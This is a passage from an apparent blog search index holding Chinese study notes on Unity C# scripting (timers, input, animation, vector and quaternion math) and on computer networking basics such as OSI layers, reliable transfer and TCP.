class="keyword">void</span> <span class="title">TimeOne</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">float</span> time = Time.time;</span><br><span class="line">    <span class="keyword">if</span> (time &gt; <span class="keyword">this</span>.nextTime &amp;&amp; second &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.second--;</span><br><span class="line">        <span class="keyword">this</span>.text.text = <span class="built_in">string</span>.Format(<span class="string">&quot;&#123;0:d2&#125;:&#123;1:d2&#125;&quot;</span>, <span class="keyword">this</span>.second / <span class="number">60</span>, <span class="keyword">this</span>.second % <span class="number">60</span>);</span><br><span class="line">        <span class="keyword">this</span>.nextTime++;</span><br><span class="line">        <span class="keyword">if</span> (second &lt; <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.text.color = Color.red;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.Update 调用，判断每帧累计时间是否达到目标时间。</span></span><br><span class="line"><span class="comment">// （例：蓄力技能）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TimeTwo</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>.countTime += Time.deltaTime;</span><br><span class="line">    <span class="keyword">if</span> ( countTime &gt;= <span class="number">1</span> &amp;&amp; second &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.second--;</span><br><span class="line">        <span class="keyword">this</span>.text.text = <span class="built_in">string</span>.Format(<span class="string">&quot;&#123;0:d2&#125;:&#123;1:d2&#125;&quot;</span>, <span class="keyword">this</span>.second / <span class="number">60</span>, <span class="keyword">this</span>.second % <span class="number">60</span>);</span><br><span class="line">        <span class="keyword">if</span> (second &lt; <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.text.color = Color.red;</span><br><span class="line">        &#125;</span><br><span class="line">        countTime -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.Start 调用，每固定时间执行一次。（InvokeRepeating）</span></span><br><span class="line"><span class="comment">// （例：固定刷新）</span></span><br><span class="line">InvokeRepeating(<span class="string">&quot;TimeThree&quot;</span>, <span class="number">1</span>, <span class="number">1</span>);  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TimeThree</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(second &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.second--;</span><br><span class="line">        <span class="keyword">this</span>.text.text = <span class="built_in">string</span>.Format(<span class="string">&quot;&#123;0:d2&#125;:&#123;1:d2&#125;&quot;</span>, <span class="keyword">this</span>.second / <span class="number">60</span>, <span class="keyword">this</span>.second % <span class="number">60</span>);</span><br><span class="line">        <span class="keyword">if</span> (second &lt; <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.text.color = Color.red;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        CancelInvoke(<span class="string">&quot;TimeThree&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-7-Input"><a href="#4-7-Input" class="headerlink" title="4.7 Input"></a>4.7 Input</h4><ul><li><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 鼠标按键被按住时返回true（持续，按住时一直返回true）</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetMouseButton(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 用户按下鼠标第一帧时返回true（单帧）</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetMouseButtonDown(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 用户释放鼠标第一帧时返回true（单帧）</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetMouseButtonUP(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 0：左键，1：右键，2：中键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 键盘按键被按住时返回true（</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetKey(KeyCode.A);</span><br><span class="line"><span class="comment">// 用户按下键盘按键第一帧时返回true</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetKeyDown(KeyCode.A);</span><br><span class="line"><span class="comment">// 用户释放键盘按键第一帧时返回true</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetKeyUp(KeyCode.A);</span><br><span class="line"><span class="comment">// KeyCode.*：键盘按钮</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断虚拟轴是否被按下，同理上面，虚拟轴名在InputManage中设置</span></span><br><span class="line"><span class="built_in">bool</span> res = Input.GetButton(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="built_in">bool</span> res = Input.GetButtonDown(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="built_in">bool</span> res = Input.GetButtonUp(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 获得虚拟轴名被按下后的值</span></span><br><span class="line"><span class="comment">// 存在中间值的返回，如0-&gt;1过程中返回了0.3</span></span><br><span class="line"><span class="built_in">float</span> <span class="keyword">value</span> = Input.GetAxis(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 只有-1,0,1的返回</span></span><br><span class="line"><span class="built_in">float</span> <span class="keyword">value</span> = Input.GetAxisRaw(<span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 按C同时按D（要有一个down，否则会一直执行）</span></span><br><span class="line"><span class="keyword">if</span>(Input.GetKey(KeyCode.C)&amp;&amp;Input.GetKeyDown(KeyCode.D));</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-8-其他函数"><a href="#4-8-其他函数" class="headerlink" title="4.8 其他函数"></a>4.8 其他函数</h4><ul><li><p>唤醒</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 延时后执行。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Invoke</span>(<span class="params"><span class="string">&quot;MethodName&quot;</span> , <span class="string">&quot;time&quot;</span></span>)</span>; </span><br><span class="line"><span class="comment">// 重复执行。（方法，开始时间，间隔（单位秒））</span></span><br><span class="line">InvokeRepeating(<span class="string">&quot;MethodName&quot;</span> , start_time , Repeat_rate );</span><br><span class="line"><span class="comment">// 取消重复。（不填方法名将停止当前脚本所有 Invoke 和 InvokeRepeating 方法）</span></span><br><span class="line">CancelInvoke(<span class="string">&quot;MethodName&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="5-常用API组成功能"><a href="#5-常用API组成功能" class="headerlink" title="5 常用API组成功能"></a>5 常用API组成功能</h3><h4 id="1-材质操作"><a href="#1-材质操作" class="headerlink" title="1 材质操作"></a>1 材质操作</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得物体材质</span></span><br><span class="line">MeshRenderer meshRenderer = <span class="keyword">this</span>.GetComponent&lt;MeshRenderer&gt;();</span><br><span class="line"><span class="keyword">this</span>.material = meshRenderer.materials[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改颜色</span></span><br><span class="line"><span class="keyword">this</span>.material.color = Color.yellow;</span><br></pre></td></tr></table></figure><h4 id="2-transform变换"><a href="#2-transform变换" class="headerlink" title="2 transform变换"></a>2 transform变换</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 每帧更新,乘deltaTime依渲染移动</span></span><br><span class="line"><span class="keyword">this</span>.transform.Translate(<span class="number">0</span>, <span class="number">0</span>, moveSpeed * Time.deltaTime);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不随镜头角度变化的移动</span></span><br><span class="line"><span class="keyword">this</span>.transform.Translate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,Space.World);</span><br><span class="line"><span class="comment">// 随镜头角度变化的移动</span></span><br><span class="line"><span class="keyword">this</span>.transform.Translate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,Space.Self);</span><br></pre></td></tr></table></figure><h4 id="3-动画"><a href="#3-动画" class="headerlink" title="3 动画"></a>3 动画</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Update中动画要用IsPlaying判断，不能做成else</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(anim.a)&#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span>(anim.b)&#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="三、动画"><a href="#三、动画" class="headerlink" title="三、动画"></a>三、动画</h2><h3 id="1-UI"><a href="#1-UI" class="headerlink" title="1 UI"></a>1 UI</h3><blockquote><p>using UnityEngine.UI;</p></blockquote><h3 id="2-Animation"><a href="#2-Animation" class="headerlink" title="2 Animation"></a>2 Animation</h3><blockquote><p>脚本控制 Animation 时要把组件中的 Play Automatically 关闭。</p></blockquote><ul><li><p>属性</p></li><li><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// animation是对象，name是动画片段名称</span></span><br><span class="line"><span class="comment">// 是否正在播放</span></span><br><span class="line"><span class="built_in">bool</span> isPlay = anim.isPlaying;</span><br><span class="line"><span class="built_in">bool</span> isPlay = anim.isPlaying(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 立刻播放动画</span></span><br><span class="line">anim.Play(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 播放队列，一个一个播放</span></span><br><span class="line">anim.PlayQueued(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 播放速度，0不播，1正常，-1倒着播</span></span><br><span class="line">anim[<span class="string">&quot;name&quot;</span>].speed = num;</span><br><span class="line"><span class="comment">// 动画总长度</span></span><br><span class="line">anim[<span class="string">&quot;name&quot;</span>].length;</span><br><span class="line"><span class="comment">// 当前播放时间</span></span><br><span class="line">anim[<span class="string">&quot;name&quot;</span>].time;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 淡入播放name且淡出其他动画</span></span><br><span class="line">anim.animation.CrossFade(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">anim.CrossFadeQueued(<span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开关门</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnMouseDown</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!doorState) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 开门</span></span><br><span class="line">        door[animName].speed = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 正着播不用设置时间，默认从0开始</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 关门</span></span><br><span class="line">        door[animName].speed = <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">// 默认时间是0，倒着播要设置，否则是0-&gt;0</span></span><br><span class="line">        <span class="comment">// 判断当前不在播放才从尾开始，否则直接当前位置倒着播</span></span><br><span class="line">        <span class="keyword">if</span>(door.isPlaying == <span class="literal">false</span>)</span><br><span class="line">        door[animName].time = door[animName].length;</span><br><span class="line">    &#125;</span><br><span class="line">    door.Play(animName);</span><br><span class="line">    doorState = !doorState;</span><br></pre></td></tr></table></figure></li><li><p>异常</p><blockquote><p><a href="https://blog.csdn.net/Prototype___/article/details/124773832">Legacy异常</a></p><p><a href="https://blog.csdn.net/qq_41968782/article/details/110476429">事件没有绑定方法</a></p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Legacy(遗产):2019版本后</span></span><br><span class="line"><span class="number">1.</span>动画——Inspector的Normal改Debug;</span><br><span class="line"><span class="number">2.</span>勾选Legacy;</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="四、三维数学"><a href="#四、三维数学" class="headerlink" title="四、三维数学"></a>四、三维数学</h2><h3 id="1-Mathf"><a href="#1-Mathf" class="headerlink" title="1 Mathf"></a>1 Mathf</h3><ul><li><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// π</span></span><br><span class="line">Mathf.PI;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 角度=&gt;弧度</span></span><br><span class="line">radian = angle * Mathf.Deg2Rad;</span><br><span class="line"><span class="comment">// 弧度=&gt;角度</span></span><br><span class="line">angle = radian * Mathf.Rad2Deg;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 绝对值</span></span><br><span class="line">Mathf.Abs(num);</span><br><span class="line"><span class="comment">// 次方</span></span><br><span class="line">Mathf.Pow(num,pow);</span><br><span class="line"><span class="comment">// 开方</span></span><br><span class="line">Mathf.Sqrt(num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三角函数（知道一边一角求另一边）</span></span><br><span class="line">Mathf.Sin/Cos/Tan(<span class="built_in">float</span> radian);</span><br><span class="line"><span class="comment">// 反三角函数（知道两边求角）</span></span><br><span class="line">Mathf.Asin/Acos/Atan(<span class="built_in">float</span> radian);</span><br><span class="line"><span class="comment">// 起点向终点移动。起终步长（1f为100%），返回移动后位置</span></span><br><span class="line">point = Mathf.Lerp(start,end,step);</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 弧度转</span></span><br><span class="line">radian = angle * Mathf.PI / <span class="number">180</span>;</span><br><span class="line">radian = angle * Mathf.Deg2Rad;</span><br><span class="line"><span class="comment">// 角度转弧度</span></span><br><span class="line">angle = radian * <span class="number">180</span> / Mathf.PI;</span><br><span class="line">angle = radian * Mathf.Rad2Deg;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-向量"><a href="#2-向量" class="headerlink" title="2 向量"></a>2 向量</h3><ul><li><p>属性</p><blockquote><p>二维向量的模长用公式自己算。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原点</span></span><br><span class="line">Vector3.zero;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向量平方和的平方根</span></span><br><span class="line"><span class="built_in">float</span> m = vector.magnitude;</span><br><span class="line"><span class="comment">// 向量模平方</span></span><br><span class="line"><span class="built_in">float</span> m = vector.sqrMagnitude;</span><br><span class="line"><span class="comment">// 单位向量，向量方向，归一化，标准化</span></span><br><span class="line">Vector3 n = pos.normalized;</span><br></pre></td></tr></table></figure></li><li><p>运算</p><blockquote><p>向量点乘：<script type="math/tex">a*b=|a||b|cos<a,b></script>，反余弦角度在[0,180]之间。</p><p>向量叉乘：<script type="math/tex">a×b=|a||b|sin<a,b></script>，Unity中方向左手规则。反余弦角度在[0,90]之间。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 向量相减，各分量相减（结果的起点在原点，加同理。乘除只能对数值操作）</span></span><br><span class="line">Vector3 vector = vector_X - vector_y;</span><br><span class="line"><span class="comment">// 向量点乘，常用于获得夹角（两标准化向量点乘就是夹角的余弦值）（返回值范围0-180）</span></span><br><span class="line"><span class="built_in">float</span> dot = Vector3.Dot(va,vb);</span><br><span class="line"><span class="comment">// 向量叉乘</span></span><br><span class="line">Vector vector = Vector3.Cross(a,b);</span><br></pre></td></tr></table></figure></li><li><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UnityEngine和System.Numerics命名空间都有Vector3，需要明确引用的命名空间</span></span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两点距离</span></span><br><span class="line">Vector3.Distance(a,b);</span><br><span class="line"><span class="comment">// 将向量设为单位向量</span></span><br><span class="line">vector.Normalize();</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.求模长的三种方法</span></span><br><span class="line"><span class="built_in">float</span> m = Mathf.Sqrt(Mathf.Pow(pos.x,<span class="number">2</span>)+Mathf.Pow(pos.y,<span class="number">2</span>)+Mathf.Pow(pos.z,<span class="number">2</span>));</span><br><span class="line"><span class="built_in">float</span> m = pos.magnitude; </span><br><span class="line"><span class="built_in">float</span> m = Vector3.Distance(Vector3.zero,pos);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.获取向量的方向</span></span><br><span class="line">Vector3 n = pos / pos.magnitude;</span><br><span class="line">Vector3 n = pos.normalized;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.沿方向移动（避免物体间距产生影响）</span></span><br><span class="line">point.Translate(Direction.normalized);</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-旋转"><a href="#3-旋转" class="headerlink" title="3 旋转"></a>3 旋转</h3><ul><li><p>概念</p><blockquote><p>欧拉角：用三个角度来保存方位。（xz轴转沿自身旋转，y轴转沿世界旋转）</p><p>欧拉角的数据类型是Vector3，欧拉角没有大小和方向，仅因为有xyz所以用Vector3存储。</p><p>欧拉角优点：好使方便。</p><p>欧拉角弊端：</p><ol><li><p>方位表达不唯一（[250,0,0]和[290,180,180]是同一个角度）。所以为了保证唯一用代码操作角度时，x限定在[-90,90]，yz限定[0,360]。</p></li><li><p>万向节死锁。物体沿X轴旋转90度后，自身Z轴会与世界Y轴重合，此时再沿Y或Z旋转时将失去一个自由度。在次情况下，规定沿Y轴完成绕竖直轴的全部旋转，此时Z轴旋转为0。</p></li></ol><p>四元数：3D中表示旋转，旋转都沿自身，分量如下（值域都是[-1,1]）：</p><ul><li><script type="math/tex; mode=display">x=sin(Θ/2)*V.x</script></li><li><script type="math/tex; mode=display">y=sin(Θ/2)*V.y</script></li><li><script type="math/tex; mode=display">z=sin(Θ/2)*V.z</script></li><li><script type="math/tex; mode=display">w=cos(Θ/2)</script></li></ul><p>四元数优点：没有死锁。</p><p>四元数弊端：难用，不建议单独改某个值，存在不合法的四元数值。</p></blockquote></li><li><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方向向量（没有下左后属性，想获得直接取负）</span></span><br><span class="line"><span class="keyword">this</span>.transform.up;</span><br><span class="line"><span class="keyword">this</span>.transform.right;</span><br><span class="line"><span class="keyword">this</span>.transform.forward;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 欧拉角</span></span><br><span class="line">Vector3 eulerAngle = <span class="keyword">this</span>.transform.eulerAngles;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 四元数</span></span><br><span class="line">Quaternion qt = <span class="keyword">this</span>.transform.rotation;</span><br></pre></td></tr></table></figure></li><li><p>运算</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 两个四元数相乘可以组合旋转效果</span></span><br><span class="line">Quaternion.Euler(<span class="number">0</span>,<span class="number">50</span>,<span class="number">0</span>) = Quaternion.Euler(<span class="number">0</span>,<span class="number">30</span>,<span class="number">0</span>) * Quaternion.Euler(<span class="number">0</span>,<span class="number">20</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li><li><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 四元数转换成欧拉角</span></span><br><span class="line"><span class="keyword">this</span>.transform.rotation = Quaternion.Euler(x,y,z);</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 四元数原始设置</span></span><br><span class="line"><span class="comment">// 设置旋转轴</span></span><br><span class="line">Vector3 axis = Vector3.up;</span><br><span class="line"><span class="comment">// 设置旋转弧度</span></span><br><span class="line"><span class="built_in">float</span> rad = <span class="number">50</span> * Mathf.Deg2Rad;</span><br><span class="line"><span class="comment">// 设置四元数</span></span><br><span class="line">Quaternion qt = <span class="keyword">new</span> Quaternion();</span><br><span class="line">qt.x = Mathf.Sin(rad / <span class="number">2</span>) * axis.x;</span><br><span class="line">qt.y = Mathf.Sin(rad / <span class="number">2</span>) * axis.y;</span><br><span class="line">qt.z = Mathf.Sin(rad / <span class="number">2</span>) * axis.z;</span><br><span class="line">qt.w = Mathf.Cos(rad / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">this</span>.transform.rotation = qt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前方10m，30度位置</span></span><br><span class="line">Vector3 rect = <span class="keyword">this</span>.transform.position + Quaternion.Euler(<span class="number">0</span>,<span class="number">30</span>,<span class="number">0</span>) * <span class="keyword">this</span>.transform.rotation * <span class="keyword">new</span> Vector3(<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">// 分步</span></span><br><span class="line"><span class="comment">// vect向量根据当前物体旋转而旋转</span></span><br><span class="line">rect = <span class="keyword">this</span>.transform.rotation * <span class="keyword">new</span> Vector3(<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">// vect向量沿y轴旋转30度</span></span><br><span class="line">rect = Quaternion.Euler(<span class="number">0</span>,<span class="number">30</span>,<span class="number">0</span>) * rect;</span><br><span class="line"><span class="comment">// vect向量移动到当前物体位置</span></span><br><span class="line">rect = <span class="keyword">this</span>.transform.position + rect;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> Unity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/posts/e255a10a.html"/>
      <url>/posts/e255a10a.html</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><hr><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-网络边缘"><a href="#1-网络边缘" class="headerlink" title="1 网络边缘"></a>1 网络边缘</h3><blockquote><p>定义：接入网的终端。</p><p>互联网很多核心内容都是建立在互联网边缘的端系统的应用之上实现的。</p></blockquote><h3 id="2-网络核心"><a href="#2-网络核心" class="headerlink" title="2 网络核心"></a>2 网络核心</h3><blockquote><p>定义：主干网。</p></blockquote><h3 id="3-七层模型"><a href="#3-七层模型" class="headerlink" title="3 七层模型"></a>3 七层模型</h3><blockquote><p><a href="https://baike.sogou.com/v6873774.htm?fromTitle=ISO%2FOSI七层模型">七层模型</a></p></blockquote><ul><li>应用层</li><li>表示层</li><li>会话层</li><li>传输层</li><li>网络层</li><li>数据链路层</li><li>物理层</li></ul><hr><h2 id="二、物理层"><a href="#二、物理层" class="headerlink" title="二、物理层"></a>二、物理层</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h3><blockquote><p>数据单元（PDU）是比特。</p></blockquote><hr><h2 id="三、数据链路层"><a href="#三、数据链路层" class="headerlink" title="三、数据链路层"></a>三、数据链路层</h2><h3 id="1-概述-1"><a href="#1-概述-1" class="headerlink" title="1 概述"></a>1 概述</h3><blockquote><p>数据单元（PDU）是帧。</p></blockquote><h3 id="2-ARP"><a href="#2-ARP" class="headerlink" title="2 ARP"></a>2 ARP</h3><hr><h2 id="四、网络层"><a href="#四、网络层" class="headerlink" title="四、网络层"></a>四、网络层</h2><h3 id="1-概述-2"><a href="#1-概述-2" class="headerlink" title="1 概述"></a>1 概述</h3><blockquote><p>点到点 主机到主机的通信 数据单元（PDU）是分组。</p></blockquote><h3 id="2-IPv4"><a href="#2-IPv4" class="headerlink" title="2 IPv4"></a>2 IPv4</h3><blockquote><p><a href="https://blog.csdn.net/xiaoxiaodechongzi/article/details/117473775">如何购买公网IP</a></p></blockquote><ul><li><p><a href="https://blog.csdn.net/glpghz/article/details/105517837">IP地址划分</a></p></li><li><p>特殊ip地址</p><ul><li>169.254.0.0/16：用于DHCP。<a href="https://www.zhihu.com/question/496523449">B类保留地址</a></li></ul></li></ul><h3 id="3-IPv6"><a href="#3-IPv6" class="headerlink" title="3 IPv6"></a>3 IPv6</h3><h3 id="4-ICMP"><a href="#4-ICMP" class="headerlink" title="4 ICMP"></a>4 ICMP</h3><h3 id="5-IMGP"><a href="#5-IMGP" class="headerlink" title="5 IMGP"></a>5 IMGP</h3><h3 id="6-路由协议"><a href="#6-路由协议" class="headerlink" title="6 路由协议"></a>6 路由协议</h3><ul><li><p><a href="https://baike.sogou.com/v142627880.htm?fromTitle=DSDV协议">DSDV  目的节点序列距离矢量</a></p><blockquote><p>Destination-Sequenced Distance Vectoring.</p></blockquote></li><li><p><a href="https://baike.sogou.com/v75879466.htm?fromTitle=aodv">AODV 无线自组网按需平面距离矢量路由协议</a></p><blockquote><p>Ad hoc on-demand distance vector routing.</p></blockquote></li></ul><hr><h2 id="五、传输层"><a href="#五、传输层" class="headerlink" title="五、传输层"></a>五、传输层</h2><h3 id="1-概述-3"><a href="#1-概述-3" class="headerlink" title="1 概述"></a>1 概述</h3><blockquote><p>端到端 进程到进程的通信 数据单元（PDU）是报文段。</p></blockquote><h3 id="2-多路复用和解复用"><a href="#2-多路复用和解复用" class="headerlink" title="2 多路复用和解复用"></a>2 多路复用和解复用</h3><ul><li><p>多路复用：multiplexing（Mux）</p><blockquote><p>服务器同一个IP和Port收不同的客户端的响应。（TCP会对应不同的套接字，UDP不会）</p><p>将多个数据流（streams）合并为一个数据流；把传给不同人的数据压在了一起。</p><p>你的的手机正在浏览网页，刷新电子邮件，同时连接到微信。所有这些连接都通过同一链路发送。</p></blockquote></li><li><p>解多路复用：demultiplexing</p><blockquote><p>解刚刚收到的通信信息给不同的套接字（TCP）。</p><p>上面的逆过程，数据流被分离成单独的部分，相当于解码。</p><p>手机接收到的数据包流将被分割并发送到相应的网络、电子邮件、微信程序。</p></blockquote></li></ul><h3 id="3-校验和"><a href="#3-校验和" class="headerlink" title="3 校验和"></a>3 校验和</h3><ol><li>所有部分分成16bit一组，不足补0。</li><li>求和，计算溢出的1加到尾部。</li><li>取反作为校验和。（或二进制求反相加）</li><li>接收端接收后也按①②进行计算，最后直接和校验和相加，若等于FFFF表示未出错。（或直接二进制求反相加，结果一致）</li></ol><h3 id="4-可靠传输"><a href="#4-可靠传输" class="headerlink" title="4 可靠传输"></a>4 可靠传输</h3><ul><li><p>RDT 可靠数据传输协议</p><blockquote><p>Reliable Data Transfer。</p><p>使用有限状态机 (FSM) 来描述发送方和接收方。</p></blockquote><ul><li><p>rdt 1.0：完全可靠传输</p></li><li><p>rdt 2.0：存在差错（ACK和NAK进行确认）</p></li><li><p>rdt 2.1：保证ACK/NAK不出错</p></li><li><p>rdt 2.2：取消NAK</p></li><li><p>rdt 3.0：超时重传（包重发，不是ACK重发）</p></li></ul></li><li><p>流水线协议：未接收确认就发送下一个包（增大利用率）</p></li><li><p>滑动窗口协议</p><blockquote><p>SW / RW（发送方窗口数 接收方窗口数）</p><p>n个分组，序号2 ** n个</p><p>GBN最大窗口数：2 ** n - 1</p><p>SR最大窗口数：2 <strong> ( n - 1 )，总和最大数：2 </strong> n</p></blockquote><ul><li><p>SW  = 1 ; RW = 1：Stop and Wait</p><blockquote><p>Stop and Wait（停止等待协议（ 如上的rdt3.0 ））</p></blockquote></li><li><p>SW  &gt; 1 ; RW = 1：GBN</p><blockquote><p>ACK具有累计确认性。（一个ACK序号可以确保之前的包已经受到）</p><p>异常：超时后窗口中的包全部重发。</p></blockquote></li><li><p>SW  &gt; 1 ; RW &gt; 1：SR</p><blockquote><p>ACK不具有累计确认性。</p><p>异常：超时后只发送超时的窗口中的包。</p><p>SR复杂于GBN：简单工作GBN，复杂SR。</p></blockquote></li></ul></li></ul><h3 id="5-TCP"><a href="#5-TCP" class="headerlink" title="5 TCP"></a>5 TCP</h3><ul><li><p>报头<img src="/posts/e255a10a/TCP报头.jpg" alt="img"></p><ul><li>序号：报文段首字节的在字节流的编号。（偏移量）（编号一般不从0开始，防止残留包识别错误)</li><li>确认号: 期望从另一方收到的下一个字节的序号。累积确认。</li></ul></li><li><p>RTT和超时设置</p><ul><li><p>采样</p><blockquote><p>设置为：中心值+4标准差。</p></blockquote></li><li><p>设置</p><blockquote><p>局域网可仅设置一次，波动大的需要动态设置（每隔一段时间测一次，然后加权。（之前测的权重低，新测的值权重高）计算平均值）</p></blockquote></li></ul></li><li><p>TCP设置</p><ul><li>累计确认。</li><li>超时重传最老的一个包，定时器也是仅设置为最老的一个包的定时（滑动窗口)。</li><li>快速重传：重复的确认，例如收到了ACK50,之后又收到3个ACK50。</li></ul></li><li><p>流量控制</p><ul><li>Piggybacking：捎带技术，在数据中心带上接收方的缓冲区大小防止发送方发送数据过多。</li></ul></li><li><p>连接管理</p><ul><li><p>两次握手失败</p><ol><li>客户端定时器超时，多次重发连接请求，服务器维护了多个无效的半连接。</li></ol></li><li><p>三次握手</p></li><li><p>四次挥手</p></li></ul></li></ul><h3 